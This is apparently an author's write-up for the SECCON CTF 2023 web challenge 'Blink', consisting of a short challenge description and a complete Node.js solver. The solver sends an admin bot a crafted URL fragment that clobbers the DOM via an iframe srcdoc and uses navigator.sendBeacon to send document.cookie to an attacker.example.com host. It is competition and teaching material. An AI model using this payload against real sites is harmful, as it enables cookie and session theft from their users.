---
title: "Blink - SECCON CTF 2023 Quals"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "blink", "web", "seccon-ctf-2023-quals"]
summary: "Popover API is supported from Chrome 114."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/web/blink"
license: "none stated"
ctf:
  name: "SECCON CTF 2023 Quals"
  year: 2023
  challenge: "Blink"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/web/blink>
- **CTF:** SECCON CTF 2023 Quals

---

# [web] blink

## Description

Popover API is supported from Chrome 114. The awesome API is so useful that you can easily implement `<blink>`.

- Challenge: `http://blink.seccon.games:3000`
- Admin bot: `http://blink.seccon.games:1337`

## Attachments

- [blink](files/blink)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e ATTACKER_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/web/blink/solver/index.js>

```javascript
const fastify = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");
const PORT = "8080";

const sleep = (msecs) => new Promise((resolve) => setTimeout(resolve, msecs));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  fastify.post("/", async (req, reply) => {
    // You got a flag!
    console.log(req.body);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    const url =
      `http://web:3000/#` +
      encodeURIComponent(`
        <iframe
          name="body"
          srcdoc="<a id=togglePopover href=foobar:if(!window.sent)window.sent=navigator.sendBeacon('${ATTACKER_BASE_URL}',document.cookie)></a>"
        ></iframe>
      `);

    await sleep(3 * 1000);
    await reportUrl(url);

    fail("Failed");
  });
};
start();
```
